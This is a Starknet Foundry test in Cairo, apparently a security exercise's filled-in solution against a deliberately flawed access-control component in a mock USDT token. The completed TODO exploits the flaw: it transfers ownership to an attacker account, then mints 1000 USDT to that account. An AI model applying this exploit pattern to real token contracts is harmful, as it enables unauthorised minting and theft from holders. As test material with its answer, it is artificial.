use starknet::{ContractAddress};
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait, 
    start_cheat_caller_address, stop_cheat_caller_address
};
use openzeppelin::token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
use openzeppelin::access::ownable::interface::{IOwnableDispatcher, IOwnableDispatcherTrait};

use access_control::faulty_component::usdt::{
    IERC20MintingAndBurningDispatcher, IERC20MintingAndBurningDispatcherTrait
};

const USDT_DECIMALS: u256 = 1000000;

fn deploy_usdt() -> (ContractAddress, IERC20Dispatcher, IERC20MintingAndBurningDispatcher, IOwnableDispatcher) {
    // Declaring the contract class
    let contract_class = declare("USDTToken").unwrap().contract_class();
    // Creating the data to send to the constructor, first specifying as a default value
    let mut data_to_constructor = Default::default();
    // Creating the address of the deployer
    let deployer: ContractAddress = 123.try_into().unwrap();
    // Packing the data into the constructor
    Serde::serialize(@deployer, ref data_to_constructor);
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();

    return (
        address,
        IERC20Dispatcher { contract_address: address },
        IERC20MintingAndBurningDispatcher { contract_address: address },
        IOwnableDispatcher { contract_address: address }
    );
}

#[test]
fn test_faulty_component() {
    // Deploying the contracts
    let (
        usdt_address, usdt_dispatcher, 
        minting_dispatcher, ownable_dispatcher
    ) = deploy_usdt();

    // Creating the Attacker account
    let attacker: ContractAddress = 1.try_into().unwrap();

    // TODO: Mint at least 1000 USDT to the attacker
    ownable_dispatcher.transfer_ownership(attacker);
    start_cheat_caller_address(usdt_address, attacker);
    minting_dispatcher.mint(attacker, 1000 * USDT_DECIMALS);
    stop_cheat_caller_address(usdt_address);

    // The attacker should have at least 1000 USDT
    assert(usdt_dispatcher.balance_of(attacker) >= 1000 * USDT_DECIMALS, 'Wrong balance');
}
